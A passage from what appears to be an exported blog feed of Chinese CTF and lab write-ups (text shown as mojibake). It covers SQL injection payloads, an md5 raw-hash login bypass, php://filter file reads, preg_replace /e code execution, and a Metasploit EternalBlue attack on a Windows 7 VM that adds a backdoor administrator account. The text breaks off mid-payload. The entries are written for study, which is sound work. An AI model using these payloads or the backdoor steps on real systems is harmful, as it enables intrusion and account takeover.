angelscript">?username=admin&amp;password=dad%<span class="hljs-number">27</span><span class="hljs-keyword">or</span>(updatexml(<span class="hljs-number">1</span>,concat(<span class="hljs-number">0x7e</span>,(select(right(password,<span class="hljs-number">30</span>))<span class="hljs-keyword">from</span>(geek.H4rDsq1)),<span class="hljs-number">0x7e</span>),<span class="hljs-number">1</span>))%<span class="hljs-number">23</span></code></pre></div><h2 id="ç½‘é¼æ¯-2018-Fakebook"><a href="#ç½‘é¼æ¯-2018-Fakebook" class="headerlink" title="[ç½‘é¼æ¯ 2018]Fakebook"></a>[ç½‘é¼æ¯ 2018]Fakebook</h2><p>sqlæ³¨å…¥+ååºåˆ—åŒ–+ä»£ç å®¡è®¡</p><h2 id="GXYCTF2019-BabySQli"><a href="#GXYCTF2019-BabySQli" class="headerlink" title="[GXYCTF2019]BabySQli"></a>[GXYCTF2019]BabySQli</h2><p>ä¸‹è½½çš„æºç ï¼Œæœ‰åŠ©äºåé¢åšé¢˜</p><div class="hljs"><pre><code class="hljs php">mysqli_query($con,<span class="hljs-string">'SET NAMES UTF8'</span>);$name = $_POST[<span class="hljs-string">'name'</span>];$password = $_POST[<span class="hljs-string">'pw'</span>];$t_pw = md5($password);     <span class="hljs-comment">//å¯¹ä¼ å…¥çš„passwordå‚æ•°è¿›è¡Œäº†md5åŠ å¯†</span>$sql = <span class="hljs-string">"select * from user where username = '"</span>.$name.<span class="hljs-string">"'"</span>;<span class="hljs-comment">// echo $sql;</span>$result = mysqli_query($con, $sql);<span class="hljs-keyword">if</span>(preg_match(<span class="hljs-string">"/\(|\)|\=|or/"</span>, $name))&#123;  <span class="hljs-comment">//  è¿‡æ»¤äº†() | = or </span><span class="hljs-keyword">die</span>(<span class="hljs-string">"do not hack me!"</span>);&#125;<span class="hljs-keyword">else</span>&#123;<span class="hljs-keyword">if</span> (!$result) &#123;printf(<span class="hljs-string">"Error: %s\n"</span>, mysqli_error($con));<span class="hljs-keyword">exit</span>();&#125;<span class="hljs-keyword">else</span>&#123;<span class="hljs-comment">// echo '&lt;pre&gt;';</span>$arr = mysqli_fetch_row($result);<span class="hljs-comment">// print_r($arr);</span><span class="hljs-keyword">if</span>($arr[<span class="hljs-number">1</span>] == <span class="hljs-string">"admin"</span>)&#123;<span class="hljs-keyword">if</span>(md5($password) == $arr[<span class="hljs-number">2</span>])&#123;    <span class="hljs-comment">//</span><span class="hljs-keyword">echo</span> $flag;&#125;<span class="hljs-keyword">else</span>&#123;<span class="hljs-keyword">die</span>(<span class="hljs-string">"wrong pass!"</span>);&#125;&#125;<span class="hljs-keyword">else</span>&#123;<span class="hljs-keyword">die</span>(<span class="hljs-string">"wrong user!"</span>);&#125;&#125;&#125;</code></pre></div><p>éšä¾¿è¾“å…¥ç”¨æˆ·åå’Œå¯†ç ï¼ŒæŸ¥çœ‹æºç ï¼Œå‡ºç°æç¤º</p><p><img src="https://i.loli.net/2020/11/30/yMceIJS4DYLHsh6.png" srcset="/img/loading.gif" alt></p><p>è¯•äº†è¯•åº”è¯¥æ˜¯base32ï¼Œè§£ç åæ˜¯base64</p><div class="hljs"><pre><code class="hljs gcode">c<span class="hljs-number">2</span><span class="hljs-attr">VsZWN0</span>ICogZ<span class="hljs-symbol">nJvbSB1</span>c<span class="hljs-number">2</span>VyIHdoZXJlIHVzZXJuYW<span class="hljs-number">1</span>lID<span class="hljs-number">0</span>gJyRuYW<span class="hljs-number">1</span>lJw==</code></pre></div><p>ç»§ç»­è§£ç </p><div class="hljs"><pre><code class="hljs routeros">select * <span class="hljs-keyword">from</span><span class="hljs-built_in"> user </span>where username = <span class="hljs-string">'$name'</span></code></pre></div><p>æ³¨å…¥ç‚¹æ˜¯nameå‚æ•°è¿™é‡Œï¼Œä¸ä¸Šé¢æºç ä¸­çš„æŸ¥è¯¢è¯­å¥ä¸€æ ·ã€‚</p><p>ç»è¿‡æµ‹è¯•å‘ç°æœ‰ä¸‰åˆ—ï¼Œ<code>name=admin&#39; union select 1,2,3 #&amp;pw=as#</code>æ˜¾ç¤ºæ­£å¸¸ï¼Œ<code>name=admn&#39; union select 1,2,3,4#&amp;pw=as</code>æŠ¥é”™</p><p>ä½†æ˜¯é¡µé¢æ²¡æœ‰æ•°å­—å›æ˜¾ï¼Œæ‰€ä»¥å¸¸è§„çš„æ³¨å…¥åº”è¯¥æ˜¯ä¸è¡Œçš„ã€‚</p><p>å€¼å¾—æ³¨æ„çš„æ˜¯ï¼Œè¿™é¢˜å¯ä»¥çŸ¥é“usernameæ˜¯adminï¼Œ</p><p>è¾“å…¥username=admin&amp;password=11,æ—¶æç¤ºwrong pass!</p><p>è¾“å…¥username=admn&amp;password=11,æ—¶æç¤ºwrong user!ï¼Œæ‰€ä»¥å¯ä»¥åˆ¤æ–­ç”¨æˆ·åä¸ºadmin</p><p>æ¥ä¸‹æ¥ä»‹ç»ä¸€ç§æ–°çš„unionæ³¨å…¥</p><p>å…ˆå»ºç«‹ä¸€å¼ è¡¨</p><p><img src="https://i.loli.net/2020/11/30/9bS4DTXuCfmxykg.png" srcset="/img/loading.gif" alt></p><div class="hljs"><pre><code class="hljs crystal"><span class="hljs-keyword">select</span> * from test where id=<span class="hljs-number">0</span> <span class="hljs-class"><span class="hljs-keyword">union</span> <span class="hljs-title">select</span> 1,'<span class="hljs-title">admin</span>','2322';</span></code></pre></div><p>unionè¯­å¥åæŸ¥è¯¢çš„æ˜¯è¡¨ä¸­ä¸å­˜åœ¨çš„ä¸€ä¸ªæ•°æ®ï¼ŒæŸ¥è¯¢ç»“æœå¦‚ä¸‹</p><p><img src="https://i.loli.net/2020/11/30/n6EeYVXdCxH72oO.png" srcset="/img/loading.gif" alt></p><p><strong>è¿™ä¸ªç»“æœè¯´æ˜ï¼ŒunionæŸ¥è¯¢ä¸€ä¸ªä¸å­˜åœ¨çš„æ•°æ®æ—¶ï¼Œä¼šå»ºç«‹ä¸€ä¸ªè™šæ‹Ÿè¡¨</strong>ï¼Œå…¶ä¸­æ”¾ç€æ‰€æŸ¥è¯¢åˆ°çš„æ•°æ®å’ŒunionååŒ…å«çš„æ•°æ®</p><p>è¿™é‡Œå°±æ˜¯ id=1,username=admin,password=2322</p><p>è¿™æ ·å°±å¯ä»¥åˆ©ç”¨è¿™ä¸ªæ”¹å˜æ•°æ®åº“ä¸­ç”¨æˆ·çš„å¯†ç ï¼Œç„¶åç”¨è‡ªå·±è®¾ç½®çš„å¯†ç ç™»å½•</p><p>æ¥ä¸‹æ¥ï¼Œåˆ©ç”¨è¿™ç‚¹åšè¿™ä¸ªé¢˜ç›®ï¼Œé¦–å…ˆçŸ¥é“ä¸€å…±ä¸‰åˆ—ï¼Œç¬¬ä¸€åˆ—åº”è¯¥æ˜¯idï¼ŒçŸ¥é“ä¹‹åä¸¤åˆ—çš„å†…å®¹å°±å¯ä»¥äº†</p><p><code>name=adm&#39; union select 1,&#39;a&#39;,&#39;s&#39; #&amp;pw=11</code>æç¤ºçš„wrong user!</p><p><code>name=adm&#39; union select 1,&#39;admin&#39;,&#39;s&#39; #&amp;pw=11</code>æç¤ºçš„wrong pass!</p><p>ç¬¬äºŒåˆ—çš„å­—æ®µååº”è¯¥å°±æ˜¯usernameï¼Œç¬¬ä¸‰åˆ—è‡ªç„¶å°±æ˜¯passwordï¼Œä½†æ˜¯è¿™é¢˜çš„passwordå­—æ®µå­˜æ”¾çš„æ—¶md5åŠ å¯†åçš„å†…å®¹<strong>ï¼ˆçœ‹åˆ°å¸ˆå‚…ä»¬çš„wpæ‰çŸ¥é“çš„ï¼Œçœ‹åˆ°æºç ä¹Ÿç¡®å®è¿™æ ·ï¼Œä½†æ˜¯åœ¨æ¯”èµ›çš„æ—¶å€™è¿™ä¹ˆå‘ç°ä¸å¾—è€ŒçŸ¥ï¼‰</strong></p><p>payload:</p><div class="hljs"><pre><code class="hljs routeros"><span class="hljs-attribute">name</span>=000'union select 1,<span class="hljs-string">'admin'</span>,<span class="hljs-string">'b59c67bf196a4758191e42f76670ceba'</span>#&amp;<span class="hljs-attribute">pw</span>=1111</code></pre></div><p><code>b59c67bf196a4758191e42f76670ceba</code>æ˜¯1111çš„md5å€¼ï¼Œpwçš„å€¼ä¸º1111</p><p><img src="https://i.loli.net/2020/11/30/Xhp1PgH7QlejDYn.png" srcset="/img/loading.gif" alt></p>]]></content>
    
    
    <categories>
      
      <category>buuoj</category>
      
    </categories>
    
    
    <tags>
      
      <tag>äºŒåˆ†æ³¨å…¥</tag>
      
      <tag>æŠ¥é”™æ³¨å…¥</tag>
      
      <tag>unionæ–°å§¿åŠ¿</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>BJDCTF2020</title>
    <link href="/2020/09/28/BJDCTF2020/"/>
    <url>/2020/09/28/BJDCTF2020/</url>
    
    <content type="html"><![CDATA[<h1 id="BJDCTF-web"><a href="#BJDCTF-web" class="headerlink" title="BJDCTF-web"></a>BJDCTF-web</h1><a id="more"></a><h2 id="easy-md5"><a href="#easy-md5" class="headerlink" title="easy md5"></a>easy md5</h2><p>F12çœ‹åˆ°äº†æç¤ºï¼Œç»™å‡ºäº†sqlè¯­å¥</p><p><img src="https://i.loli.net/2020/11/30/xmkWoepyYVCLaXt.png" srcset="/img/loading.gif" alt></p><div class="hljs"><pre><code class="hljs pgsql">Hint: <span class="hljs-keyword">select</span> * <span class="hljs-keyword">from</span> <span class="hljs-string">'admin'</span> <span class="hljs-keyword">where</span> <span class="hljs-keyword">password</span>=md5($pass,<span class="hljs-keyword">true</span>)</code></pre></div><p>è¿™é‡Œæ˜¯å°†è¾“å…¥çš„å¯†ç è¿›è¡Œäº†ä¸€æ¬¡md5çš„åŠ å¯†</p><p>è¿™é‡Œçš„å‚æ•°raw=true ï¼Œæ‰€ä»¥æ˜¯å°†æˆ‘ä»¬è¾“å…¥çš„å¯†ç åŠ å¯†16å­—ç¬¦äºŒè¿›åˆ¶æ ¼å¼ï¼Œå¦‚æœæƒ³å®Œæˆæ³¨å…¥ï¼Œåˆ™md5å€¼ç»è¿‡hexè½¬æˆå­—ç¬¦ä¸²åä¸º â€˜orâ€™â€¦â€¦.è¿™æ ·çš„å­—ç¬¦ä¸²ï¼Œåªè¦å‡ºç°äº†orï¼Œä¸”oråé¢çš„å€¼ä¸ºçœŸå³å¯å®Œæˆæ³¨å…¥ã€‚</p><p><code>select * from &#39;admin&#39; where password=&#39; or &#39;sdaa</code></p><p>è¿™é‡Œç»å¸¸ä½¿ç”¨çš„å­—ç¬¦ä¸²æ˜¯<strong>ffifdyop</strong>ï¼Œè¯¥å­—ç¬¦ä¸²md5åŠ å¯†åè‹¥rawå‚æ•°ä¸ºTrueæ—¶ä¼šè¿”å› <strong>â€˜orâ€™6&lt;trash&gt;</strong> (&lt;trash&gt;å…¶å®å°±æ˜¯ä¸€äº›ä¹±ç å’Œä¸å¯è§å­—ç¬¦ï¼Œè¿™é‡Œåªè¦ç¬¬ä¸€ä½æ˜¯éé›¶æ•°å­—å³å¯è¢«åˆ¤å®šä¸ºTrueï¼Œåé¢çš„&lt;trash&gt;ä¼šåœ¨MySQLå°†å…¶è½¬æ¢æˆæ•´å‹æ¯”è¾ƒæ—¶ä¸¢æ‰)</p><p>æŸ¥è¯¢è¯­å¥ä¸º</p><p><code>select * from &#39;admin&#39; where password=&#39;or&#39;6&lt;trash&gt;&#39;</code>æ­¤æŸ¥è¯¢è¯­å¥ç»“æœä¸ºçœŸ</p><p>æäº¤ ffifdyopåä¼šè·³è½¬åˆ°å¦å¤–çš„é¡µé¢ï¼ŒæŸ¥çœ‹æºç </p><p><img src="https://i.loli.net/2020/11/30/37xcmRjU2D951VZ.png" srcset="/img/loading.gif" alt></p><p>è¿™é‡Œç›´æ¥åˆ©ç”¨md5()å‡½æ•°ä¸èƒ½å¤„ç†æ•°ç»„çš„ç‰¹æ€§ï¼Œgetæäº¤ <code>?a[]=1&amp;b[]=2</code></p><p>æ¥ä¸‹æ¥è¿˜æœ‰ä¸€æ¬¡è·³è½¬ï¼Œç›´æ¥post <code>param1[]=1&amp;param2[]=2</code>ï¼Œæ‹¿åˆ°flag</p><p><img src="/2020/09/28/BJDCTF2020/mdd5-3.png" srcset="/img/loading.gif" alt></p><h2 id="ä¸è¿‡å¦‚æ­¤"><a href="#ä¸è¿‡å¦‚æ­¤" class="headerlink" title="ä¸è¿‡å¦‚æ­¤"></a>ä¸è¿‡å¦‚æ­¤</h2><div class="hljs"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>error_reporting(<span class="hljs-number">0</span>);$text = $_GET[<span class="hljs-string">"text"</span>]; <span class="hljs-comment">//get è·å–ä¸€ä¸ªå‚æ•°text ä½¿ç”¨dataä¼ªåè®®</span>$file = $_GET[<span class="hljs-string">"file"</span>]; <span class="hljs-comment">//fileå‚æ•°ï¼Œè¿™é‡Œå¯ä»¥ä½¿ç”¨filterä¼ªåè®®è¯»å–phpé¡µé¢æºç </span><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>($text)&amp;&amp;(file_get_contents($text,<span class="hljs-string">'r'</span>)===<span class="hljs-string">"I have a dream"</span>))&#123;  <span class="hljs-comment">//text çš„å†…å®¹ä½I have a dream</span>  <span class="hljs-keyword">echo</span> <span class="hljs-string">"&lt;br&gt;&lt;h1&gt;"</span>.file_get_contents($text,<span class="hljs-string">'r'</span>).<span class="hljs-string">"&lt;/h1&gt;&lt;/br&gt;"</span>;  <span class="hljs-keyword">if</span>(preg_match(<span class="hljs-string">"/flag/"</span>,$file))&#123;                              <span class="hljs-comment">//fileå‚æ•°ä¸èƒ½åŒ…å«flag</span>    <span class="hljs-keyword">die</span>(<span class="hljs-string">"Not now!"</span>);  &#125;  <span class="hljs-keyword">include</span>($file); <span class="hljs-comment">//next.php æç¤ºäº†ä¸‹ä¸€ä¸ªé¡µé¢çš„åå­— </span>&#125;<span class="hljs-keyword">else</span>&#123;  highlight_file(<span class="hljs-keyword">__FILE__</span>);&#125;<span class="hljs-meta">?&gt;</span></code></pre></div><p>çœ‹åˆ°äº†fileå‚æ•°ï¼Œæƒ³åˆ°äº†æ–‡ä»¶åŒ…å«çš„æ¼æ´åˆ©ç”¨äºæ˜¯æ„é€ ä»¥ä¸‹çš„payload:</p><p><code>?text=data://text/plain,I%20have%20a%20dream&amp;file=php://filter/read/convert.base64-encode/resource=next.php</code></p><p>å¯¹åˆ°äº†index.phpé¡µé¢çš„base64æºç ï¼Œè§£ç åå¦‚ä¸‹</p><p>index.php</p><div class="hljs"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>$id = $_GET[<span class="hljs-string">'id'</span>];$_SESSION[<span class="hljs-string">'id'</span>] = $id;<span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">complex</span><span class="hljs-params">($re, $str)</span> </span>&#123;    <span class="hljs-keyword">return</span> preg_replace(        <span class="hljs-string">'/('</span> . $re . <span class="hljs-string">')/ei'</span>,        <span class="hljs-string">'strtolower("\\1")'</span>,        $str    );&#125;<span class="hljs-keyword">foreach</span>($_GET <span class="hljs-keyword">as</span> $re =&gt; $str) &#123;    <span class="hljs-keyword">echo</span> complex($re, $str). <span class="hljs-string">"\n"</span>;&#125;<span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">getFlag</span><span class="hljs-params">()</span></span>&#123;@<span class="hljs-keyword">eval</span>($_GET[<span class="hljs-string">'cmd'</span>]);&#125;</code></pre></div><p>åˆ©ç”¨<strong>preg_replace()ä½¿ç”¨çš„/eæ¨¡å¼å¯ä»¥å­˜åœ¨è¿œç¨‹æ‰§è¡Œä»£ç </strong></p><p>åœ¨next.phpåœ¨è¾“å…¥</p><div class="hljs"><pre><code class="hljs awk"><span class="hljs-keyword">next</span>.php?\S*=<span class="hljs-variable">$&#123;getFlag()&#125;</span>&amp;cmd=system(<span class="hljs-string">"cat /flag"</span>);</code></pre></div><p><a href="https://segmentfault.com/a/1190000018991087" target="_blank" rel="noopener">phpä¼ªåè®®</a></p><p><a href="https://xz.aliyun.com/t/2557" target="_blank" rel="noopener">preg_replace /eæ¨¡å¼æ¼æ´è¯¦è§£</a></p><h2 id="The-mystery-of-ip"><a href="#The-mystery-of-ip" class="headerlink" title="The mystery of ip"></a>The mystery of ip</h2><p>è¿›å…¥é¡µé¢ä¸çŸ¥é“å¹²å•¥ï¼Œéšä¾¿ç‚¹ç‚¹ï¼Œåˆ°flag.phpæ—¶æ˜¾ç¤ºäº†IPåœ°å€</p><p>æŸ¥çœ‹åŸç å‘ç°æç¤º<code>&lt;!-- Do you know why i know your ip? --&gt;</code></p><p>çŒœæµ‹è¿™é‡Œæ˜¯è·ŸXFFæœ‰å…³ï¼Œäºæ˜¯ä¿®æ”¹XFF:127.0.0.1ï¼Œæœç„¶é¡µé¢æ˜¾ç¤ºçš„å°±æ˜¯IPæ˜¯127.0.0.1</p><p>è¿™é‡Œå°±æƒ³åˆ°äº†XFFæ³¨å…¥ï¼Œæ˜¯å¦å¯ä»¥ç±»ä¼¼äºXFFæ³¨å…¥ï¼Œå°†ç³»ç»Ÿåä»¤æ³¨å…¥è¿›å»</p><p>é¦–å…ˆè¯•è¯•<code>system(&quot;ls /&quot;)</code>,ä½†æ˜¯å‘ç°æ²¡æœ‰è¢«æ‰§è¡Œï¼Œäºæ˜¯å®¶ä¸Šæ‹¬å·<code>{system(&quot;ls /&quot;)}</code>ï¼Œè¿™æ¬¡æ‰§è¡ŒæˆåŠŸ</p><p> è·å–flag:</p><div class="hljs"><pre><code class="hljs clojure">&#123;system(<span class="hljs-string">"cat /flag"</span>)&#125;</code></pre></div>]]></content>
    
    
    <categories>
      
      <category>ctf</category>
      
    </categories>
    
    
    <tags>
      
      <tag>md5</tag>
      
      <tag>sql</tag>
      
      <tag>phpä¼ªåè®®</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>ç½‘å®‰ä½œä¸š1</title>
    <link href="/2020/09/27/homework/"/>
    <url>/2020/09/27/homework/</url>
    
    <content type="html"><![CDATA[<h1 id="MS17-010"><a href="#MS17-010" class="headerlink" title="MS17-010"></a>MS17-010</h1><a id="more"></a><h2 id="1-å‡†å¤‡å·¥ä½œ"><a href="#1-å‡†å¤‡å·¥ä½œ" class="headerlink" title="1.å‡†å¤‡å·¥ä½œ"></a>1.å‡†å¤‡å·¥ä½œ</h2><p>å¼€å¯ä¸¤å°è™šæ‹Ÿæœºï¼Œä¸€å°kaliä½œä¸ºæ”»å‡»æ–¹ï¼Œä¸€å°win7ä½œä¸ºè¢«æ”»å‡»æ–¹</p><p>å°†ä¸¤å°è™šæ‹Ÿæœºæ¡¥æ¥åˆ°åŒä¸€ç½‘å¡ï¼Œå¹¶ä¿è¯èƒ½å¤Ÿé€šä¿¡</p><p>Kali IP 10.1.1.1  255.0.0.0  win7 IPã€€10.1.1.2  255.0.0.0</p><p>æµ‹è¯•ä¸¤å°ä¸»æœºä¹‹é—´çš„é€šä¿¡æƒ…å†µ</p><p><img src="https://i.loli.net/2020/11/30/BAUIrJYP4ahwb3Z.png" srcset="/img/loading.gif" alt="1.png"></p><p><img src="https://i.loli.net/2020/11/30/skpyjBZi8T94hbO.png" srcset="/img/loading.gif" alt="2.png"> </p><p>ä½¿ç”¨msfå‰éœ€è¦å¼€å¯postgresqlæœåŠ¡ </p><p>å¼€å¯æœåŠ¡ï¼šservice postgresql start </p><p>æŸ¥çœ‹æœåŠ¡çŠ¶æ€ï¼šservice postgresql status</p><p>å¼€åˆ°ç»¿è‰²å­—ä½“çš„activeå³ä¸ºå¼€å¯äº†</p><p>åˆå§‹åŒ–æ•°æ®åº“ï¼šmsfdb init </p><p><img src="https://i.loli.net/2020/11/30/g72amLUwHvp3jSe.png" srcset="/img/loading.gif" alt="3.png"> </p><h2 id="2-æ”»å‡»è¿‡ç¨‹"><a href="#2-æ”»å‡»è¿‡ç¨‹" class="headerlink" title="2. æ”»å‡»è¿‡ç¨‹"></a>2. æ”»å‡»è¿‡ç¨‹</h2><h3 id="1-é¦–å…ˆåˆ¤æ–­ç›®æ ‡ä¸»æœºæ˜¯å¦æ‰“å¼€445ç«¯å£"><a href="#1-é¦–å…ˆåˆ¤æ–­ç›®æ ‡ä¸»æœºæ˜¯å¦æ‰“å¼€445ç«¯å£" class="headerlink" title="(1).é¦–å…ˆåˆ¤æ–­ç›®æ ‡ä¸»æœºæ˜¯å¦æ‰“å¼€445ç«¯å£"></a>(1).é¦–å…ˆåˆ¤æ–­ç›®æ ‡ä¸»æœºæ˜¯å¦æ‰“å¼€445ç«¯å£</h3><p>ä½¿ç”¨nmap+ip æ‰«æ</p><p><img src="https://i.loli.net/2020/11/30/OPuivdSaVlTIMsm.png" srcset="/img/loading.gif" alt="4.png"> </p><h3 id="2-ç¡®è®¤ç›®æ ‡ä¸»æœºæ‰“å¼€445ç«¯å£åç›´æ¥ä½¿ç”¨msfè¿›è¡Œæ”»å‡»"><a href="#2-ç¡®è®¤ç›®æ ‡ä¸»æœºæ‰“å¼€445ç«¯å£åç›´æ¥ä½¿ç”¨msfè¿›è¡Œæ”»å‡»" class="headerlink" title="(2) .ç¡®è®¤ç›®æ ‡ä¸»æœºæ‰“å¼€445ç«¯å£åç›´æ¥ä½¿ç”¨msfè¿›è¡Œæ”»å‡»"></a>(2) .ç¡®è®¤ç›®æ ‡ä¸»æœºæ‰“å¼€445ç«¯å£åç›´æ¥ä½¿ç”¨msfè¿›è¡Œæ”»å‡»</h3><p>è¾“å…¥msfconsoleã€€å¯åŠ¨ï½ï½“ï½†</p><p>è¾“å…¥searchã€€MS17-010</p><p>æ‰¾åˆ°exploit windows/smb/ms17_010_eternalblue,</p><p>è¿è¡Œ</p><div class="hljs"><pre><code class="hljs actionscript"><span class="hljs-keyword">use</span> exploitwindows/smb/ms17_010_eternalblue</code></pre></div><p>è¾“å…¥ show options  æŸ¥çœ‹éœ€è¦é…ç½®å“ªäº›ä¿¡æ¯</p><p>RHOSTS ä¸ºç›®æ ‡ä¸»æœºIP(10.1.1.2)</p><p>RPORT ä¸ºç›®æ ‡ç«¯å£å·(445)</p><p>LHOST ä¸ºç›‘å¬ä¸»æœºIP(10.1.1.1)</p><p><img src="https://i.loli.net/2020/11/30/adxKYb5StmsJWF7.png" srcset="/img/loading.gif" alt="5.png"> </p><p> <img src="https://i.loli.net/2020/11/30/bq6YZiehzAtxEcu.png" srcset="/img/loading.gif" alt="6.png"></p><h3 id="3-é…ç½®æˆåŠŸåè®¾ç½®tcpè¿æ¥"><a href="#3-é…ç½®æˆåŠŸåè®¾ç½®tcpè¿æ¥" class="headerlink" title="(3). é…ç½®æˆåŠŸåè®¾ç½®tcpè¿æ¥"></a>(3). é…ç½®æˆåŠŸåè®¾ç½®tcpè¿æ¥</h3><p>è¾“å…¥å‘½ä»¤</p><div class="hljs"><pre><code class="hljs gams"><span class="hljs-keyword">set</span> payload <span class="hljs-comment">windows</span>/x64/<span class="hljs-comment">meterpreter</span>/reverse_tcp</code></pre></div><h3 id="4-å¼€å§‹è¿è¡Œ"><a href="#4-å¼€å§‹è¿è¡Œ" class="headerlink" title="(4).å¼€å§‹è¿è¡Œ"></a>(4).å¼€å§‹è¿è¡Œ</h3><p>è¾“å…¥ exploit/run </p><p>æˆåŠŸè·å–shell</p><p><img src="https://i.loli.net/2020/11/30/Cyj8Kt6ldzMbGh9.png" srcset="/img/loading.gif" alt="7.png"></p><p>æŸ¥çœ‹ipåœ°å€éªŒè¯æ˜¯å¦ä¸ºç›®æ ‡ä¸»æœºã€‚</p><p> <img src="https://i.loli.net/2020/11/30/OTBhu37xXEv2Pb8.png" srcset="/img/loading.gif" alt="8.png"></p><h3 id="5-è®¾ç«‹åé—¨ï¼Œåœ¨ç›®æ ‡ä¸»æœºä¸­åˆ›å»ºä¸€ä¸ªç”¨æˆ·"><a href="#5-è®¾ç«‹åé—¨ï¼Œåœ¨ç›®æ ‡ä¸»æœºä¸­åˆ›å»ºä¸€ä¸ªç”¨æˆ·" class="headerlink" title="(5)è®¾ç«‹åé—¨ï¼Œåœ¨ç›®æ ‡ä¸»æœºä¸­åˆ›å»ºä¸€ä¸ªç”¨æˆ·"></a>(5)è®¾ç«‹åé—¨ï¼Œåœ¨ç›®æ ‡ä¸»æœºä¸­åˆ›å»ºä¸€ä¸ªç”¨æˆ·</h3><p>åˆ›å»ºä¸€ä¸ªç”¨æˆ·</p><div class="hljs"><pre><code class="hljs routeros">net<span class="hljs-built_in"> user </span>test abc123.com /add</code></pre></div><p>Username:test </p><p>password:abc123.com</p><p>å°†è¯¥ç”¨æˆ·åŠ å…¥ç®¡ç†å‘˜ç»„ï¼Œä½¿å…¶æ‹¥æœ‰ç®¡ç†å‘˜æƒé™</p><div class="hljs"><pre><code class="hljs dockerfile">net localgroup administrtors test /<span class="hljs-keyword">add</span></code></pre></div><p><img src="https://i.loli.net/2020/11/30/LAqgMpZ9kUSd6ow.png" srcset="/img/loading.gif" alt="10.png"></p><p>ç›®æ ‡ä¸»æœºä¸Šç”¨æˆ·åˆ›å»ºæˆåŠŸ</p><p><img src="https://i.loli.net/2020/11/30/LPm3HzVNfW5k947.png" srcset="/img/loading.gif" alt="11.png"></p><p>  <strong>å®éªŒç»“æŸ</strong></p>]]></content>
    
    
    <categories>
      
      <category>ç½‘å®‰ä½œä¸š</category>
      
    </categories>
    
    
    <tags>
      
      <tag>msf</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>cumtctf</title>
    <link href="/2020/09/27/cumtctf/"/>
    <url>/2020/09/27/cumtctf/</url>
    
    <content type="html"><![CDATA[<h1 id="CUMTCTF-wp"><a href="#CUMTCTF-wp" class="headerlink" title="CUMTCTF-wp"></a>CUMTCTF-wp</h1><a id="more"></a><h2 id="Web"><a href="#Web" class="headerlink" title="Web"></a>Web</h2><h3 id="ç­¾åˆ°"><a href="#ç­¾åˆ°" class="headerlink" title="ç­¾åˆ°"></a>ç­¾åˆ°</h3><p>æç¤ºGETä¸€ä¸ª1,é‚£å°± url+?1</p><p>æç¤ºpostä¸€ä¸ª2</p><p>é‚£å°±postä¸€ä¸ª</p><p><strong>æ³¨æ„çš„æ˜¯è¦2=ä»»æ„å­—ç¬¦æ‰å‡ºç°æºç </strong></p><p>å®¡è®¡ä»£ç ï¼Œè¿™é‡Œåº”è¯¥æ˜¯åˆ©ç”¨file_get_contents()çš„æ¼æ´ç›´æ¥è¯»ç½‘é¡µæºç ï¼Œå¹¶ä¸”æç¤ºflagåœ¨flag.php,ç›´æ¥<code>php://filter/read=convert.base64-encode/resource=flag.php</code>ï¼Œè¯»å–base64æºç ä¹‹åè§£ç å³å¯</p><p>PD9waHANCgkkZmxhZz0iQ1VNVENURnsxNzkwNTViNC1lOGY1LTQyZDItYmZlNC0wMjdkMTVlOTQ2YjJ9Ijs=</p><h3 id="babysql"><a href="#babysql" class="headerlink" title="babysql"></a>babysql</h3><p>é¦–å…ˆåˆ¤æ–­æ˜¯å¦å­˜åœ¨æ³¨å…¥<code>username=admin&amp;password=pw&#39;</code></p><p>åœ¨åé¢åŠ ä¸Šå•å¼•å·åå‡ºç°æŠ¥é”™æç¤ºï¼Œç¡®è®¤æœ‰æ³¨å…¥ç‚¹</p><p>ä½†æ˜¯ç»§ç»­æµ‹è¯• <code>&#39;or 1=1 #</code>ä¼šå‡ºç°</p><p><img src="https://i.loli.net/2020/11/30/J6rdWUDupV4iTI5.png" srcset="/img/loading.gif" alt></p><p>åˆ¤æ–­å­˜åœ¨é»‘åå•è¿‡æ»¤ã€‚</p><p>æ¥ä¸‹æ¥å°±æ˜¯åˆ¤æ–­æ˜¯å°†ä»€ä¹ˆåŠ å…¥é»‘åå•äº†ï¼Œç»è¿‡å­—å…¸æµ‹è¯•å‘ç°æ˜¯<strong>ç©ºæ ¼</strong>ï¼Œè¿™é‡Œå¯ä»¥ä½¿ç”¨/**/ç»•è¿‡ã€‚</p><p>å…ˆæµ‹è¯•æœ‰å¤šå°‘åˆ—ï¼Œ<code>&#39;union/**/select/**/1,2,3,4,5,6,7#</code>  åˆ°ç¬¬ä¸ƒçš„æ—¶å€™ï¼Œé¡µé¢æŠ¥é”™ã€‚</p><p>   <code>&#39;union/**/select/**/1,2,3,4,5,6,7,8#</code> åˆ°ç¬¬å…«çš„æ—¶å€™æ˜¾ç¤ºä¸‹å›¾ï¼Œè¯´æ˜ä¸€å…±å…«åˆ—ï¼Œå¹¶ä¸”ç¬¬å››åˆ—å‡ºç°å›æ˜¾ã€‚</p><p><img src="https://i.loli.net/2020/11/30/bltS5moZHWkOEGF.png" srcset="/img/loading.gif" alt></p><p><strong>çˆ†è¡¨</strong></p><div class="hljs"><pre><code class="hljs sql">username=admin&amp;password=pw'union<span class="hljs-comment">/**/</span><span class="hljs-keyword">select</span><span class="hljs-comment">/**/</span><span class="hljs-number">1</span>,<span class="hljs-number">2</span>,<span class="hljs-number">3</span>,<span class="hljs-keyword">group_concat</span>(TABLE_NAME),<span class="hljs-number">5</span>,<span class="hljs-number">6</span>,<span class="hljs-number">7</span>,<span class="hljs-number">8</span><span class="hljs-comment">/**/</span><span class="hljs-keyword">from</span><span class="hljs-comment">/**/</span>information_schema.TABLES<span class="hljs-comment">/**/</span><span class="hljs-keyword">where</span><span class="hljs-comment">/**/</span>TABLE_SCHEMA=<span class="hljs-keyword">database</span>()<span class="hljs-comment">#</span></code></pre></div><p><strong>çˆ†åˆ—å</strong></p><div class="hljs"><pre><code class="hljs sql">username=admin&amp;password=pw'union<span class="hljs-comment">/**/</span><span class="hljs-keyword">select</span><span class="hljs-comment">/**/</span><span class="hljs-number">1</span>,<span class="hljs-number">2</span>,<span class="hljs-number">3</span>,<span class="hljs-keyword">group_concat</span>(COLUMN_NAME),<span 